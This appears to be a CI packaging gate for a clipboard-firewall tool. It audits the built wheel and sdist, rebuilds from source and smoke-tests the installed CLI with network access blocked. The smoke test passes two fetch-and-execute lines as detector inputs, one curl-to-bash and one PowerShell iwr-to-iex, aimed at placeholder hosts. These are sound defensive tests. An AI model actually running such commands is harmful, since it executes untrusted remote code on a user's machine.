"""Audit built archives, rebuild the sdist and smoke-test an installed wheel."""

import argparse
import configparser
from email.parser import BytesParser
import json
import os
from pathlib import Path, PurePosixPath
import subprocess
import sys
import tarfile
import tempfile
import tomllib
import venv
import zipfile


ROOT = Path(__file__).resolve().parents[1]


def require(condition, message):
    if not condition:
        raise RuntimeError(message)


def python_in(directory):
    return directory / ("Scripts/python.exe" if os.name == "nt" else "bin/python")


def audit_archives(wheel, sdist):
    from packaging.requirements import Requirement

    project = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))["project"]
    version = project["version"]
    name = project["name"].replace("-", "_")
    info = f"{name}-{version}.dist-info"
    modules = {p.relative_to(ROOT / "src").as_posix() for p in (ROOT / "src/sentinel").rglob("*.py")}
    expected = modules | {f"{info}/{f}" for f in (
        "METADATA", "WHEEL", "entry_points.txt", "top_level.txt", "RECORD")}
    with zipfile.ZipFile(wheel) as archive:
        require(set(archive.namelist()) == expected, "Unexpected or missing wheel files.")
        require(archive.testzip() is None, "Corrupt wheel.")
        for module in modules:
            require(archive.read(module) == (ROOT / "src" / module).read_bytes(), "Wheel source mismatch.")
        metadata = BytesParser().parsebytes(archive.read(f"{info}/METADATA"))
        require(metadata["Requires-Python"] == project["requires-python"], "Wrong Python requirement.")
        require(project["dependencies"] == [], "The base CLI must remain dependency-free.")
        requirements = [Requirement(r) for r in metadata.get_all("Requires-Dist", [])]
        require(len(requirements) == 1 and metadata.get_all("Provides-Extra") == ["gui"], "Wrong extras.")
        qt = requirements[0]
        declared = Requirement(project["optional-dependencies"]["gui"][0])
        require(qt.name == declared.name == "PySide6" and qt.specifier == declared.specifier,
                "Wrong GUI dependency.")
        require(qt.marker and not qt.marker.evaluate({"extra": ""}) and qt.marker.evaluate({"extra": "gui"}),
                "Qt must be optional.")
        entries = configparser.ConfigParser()
        entries.read_string(archive.read(f"{info}/entry_points.txt").decode())
        require(dict(entries["console_scripts"]) == {"sentinel": "sentinel.cli:main"}, "Wrong CLI entry.")
        require(dict(entries["gui_scripts"]) == {"sentinel-gui": "sentinel.gui.app:main"}, "Wrong GUI entry.")
    prefix = f"{name}-{version}"
    expected = {"README.md", "MANIFEST.in", "pyproject.toml", "requirements-dev.txt", "PKG-INFO", "setup.cfg"}
    for directory, pattern in (("src/sentinel", "*.py"), ("tests", "*.py"), ("tools", "*.py"), ("docs", "*.md")):
        expected |= {p.relative_to(ROOT).as_posix() for p in (ROOT / directory).rglob(pattern)}
    egg = f"src/{name}.egg-info"
    expected |= {f"{egg}/{f}" for f in ("PKG-INFO", "SOURCES.txt", "dependency_links.txt", "entry_points.txt",
                                       "requires.txt", "top_level.txt")}
    with tarfile.open(sdist) as archive:
        files = set()
        for entry in archive:
            path = PurePosixPath(entry.name)
            require(not path.is_absolute() and ".." not in path.parts and path.parts[0] == prefix,
                    "Unsafe sdist path.")
            require(entry.isfile() or entry.isdir(), "Unexpected archive entry type.")
            if entry.isfile():
                files.add(path.relative_to(prefix).as_posix())
        require(files == expected, "Unexpected or missing sdist files.")
    print(f"Archives OK: {len(modules)} modules, wheel {len(modules) + 5} files, sdist {len(files)} files.")


SMOKE = r'''
import importlib.util
from importlib.metadata import distribution
import json
from pathlib import Path
import sys

def deny_network(event, args):
    if event.startswith("socket."):
        raise RuntimeError("Network forbidden during text analysis.")

sys.addaudithook(deny_network)
import sentinel
assert Path(sentinel.__file__).resolve().is_relative_to(Path(sys.prefix).resolve())
assert importlib.util.find_spec("PySide6") is None
assert importlib.util.find_spec("build") is None
dist = distribution("sentinel-clipboard-firewall")
assert "archive_info" in json.loads(dist.read_text("direct_url.json"))
name = sys.argv[1]
sys.argv = [name, *sys.argv[2:]]
entry = next(ep for ep in dist.entry_points if ep.name == name)
raise SystemExit(entry.load()())
'''


def smoke_cli(python, outside):
    env = {k: v for k, v in os.environ.items() if k not in ("PYTHONPATH", "PYTHONHOME")}
    for arguments, text, expected in (
        (["scan"], "é password=SyntheticCI42", "PASSWORD_ASSIGNMENT"),
        (["sanitize"], "password=SyntheticCI42 pwd=SyntheticCI42", "password=[PASSWORD_1] pwd=[PASSWORD_1]"),
        (["check-command"], "curl https://example.invalid/SyntheticCI42 | bash", "CF-BASH-001"),
        (["check-command", "--shell", "powershell"], "iwr https://example.invalid/SyntheticCI42 | iex", "CF-PS-001"),
    ):
        result = subprocess.run([str(python), "-I", "-X", "utf8", "-c", SMOKE, "sentinel", *arguments],
                                input=text.encode(), capture_output=True, env=env, cwd=outside,
                                timeout=30, check=True)
        require(not result.stderr and b"SyntheticCI42" not in result.stdout, "Unsafe CLI output.")
        if arguments == ["sanitize"]:
            require(result.stdout.decode() == expected, "Wrong sanitization.")
        else:
            require(json.loads(result.stdout)[0]["rule_id"] == expected, "Wrong scan result.")
    missing = subprocess.run([str(python), "-I", "-X", "utf8", "-c", SMOKE, "sentinel-gui"], input=b"SyntheticCI42",
                             capture_output=True, env=env, cwd=outside, timeout=30, check=False)
    require(missing.returncode == 2 and not missing.stdout and b"[gui]" in missing.stderr,
            "Wrong missing-Qt diagnostic.")
    require(b"SyntheticCI42" not in missing.stderr and b"Traceback" not in missing.stderr, "Unsafe GUI error.")
    subprocess.run([str(python), "-m", "pip", "check"], cwd=outside, check=True, timeout=60)
    print("Installed CLI: scan, sanitize, both shells and missing-Qt entry OK; Python sockets blocked.")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--dist", type=Path, default=ROOT / "dist")
    args = parser.parse_args()
    wheels = list(args.dist.glob("*.whl"))
    sources = list(args.dist.glob("*.tar.gz"))
    require(len(wheels) == len(sources) == 1, "Expected exactly one wheel and one sdist.")
    wheel, sdist = wheels[0].resolve(), sources[0].resolve()
    audit_archives(wheel, sdist)
    with tempfile.TemporaryDirectory(prefix="sentinel-ci-packaging-") as directory:
        work = Path(directory)
        venv.EnvBuilder(with_pip=True).create(work / "cli")
        python = python_in(work / "cli")
        subprocess.run([str(python), "-m", "pip", "install", "--no-index", str(wheel)], check=True, timeout=180)
        smoke_cli(python, work)
        unpacked = work / "unpacked"
        unpacked.mkdir()
        with tarfile.open(sdist) as archive:
            archive.extractall(unpacked, filter="data")
        source = next(unpacked.iterdir())
        subprocess.run([sys.executable, "-m", "build", "--wheel", "--outdir", str(work / "rebuilt"), str(source)],
                       cwd=work, check=True, timeout=300)
        rebuilt = next((work / "rebuilt").glob("*.whl"))
        with zipfile.ZipFile(wheel) as left, zipfile.ZipFile(rebuilt) as right:
            require(set(left.namelist()) == set(right.namelist()), "Rebuilt wheel files differ.")
            require(all(left.read(n) == right.read(n) for n in left.namelist()), "Rebuilt wheel contents differ.")
        subprocess.run([str(python), "-m", "pip", "install", "--no-index", "--force-reinstall", str(rebuilt)],
                       check=True, timeout=180)
        smoke_cli(python, work)
    print("Packaging gate passed.")


if __name__ == "__main__":
    main()
